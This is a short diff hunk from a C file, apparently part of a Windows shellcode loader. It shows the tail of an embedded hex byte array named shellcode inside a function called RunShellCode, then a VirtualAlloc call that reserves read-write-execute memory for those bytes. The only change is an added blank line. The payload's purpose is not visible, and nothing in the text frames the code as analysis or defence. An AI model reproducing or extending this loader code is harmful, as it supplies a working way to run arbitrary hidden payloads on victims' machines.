@@ -44,6 +44,7 @@ DWORD WINAPI RunShellCode(LPVOID lpParameter) {
         "\xf9\x24\xf9\x3e\x19\xd2\xeb\x2f\xf0\x1d\x9b\x83\x98\x49\x68"
         "\xf0\x38\x65\xbf\xde\xa1\xf4\x53\xe9\xca\xf1\x35\xab\xfd\x0e"
         "\x9d\x20\x47\x4b\x5f\xab\xa4\x4f";
+    
     newMemory = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (newMemory == NULL) {
         OutputDebugStringW(L"FAILED TO ALLOCATE MEMORY");
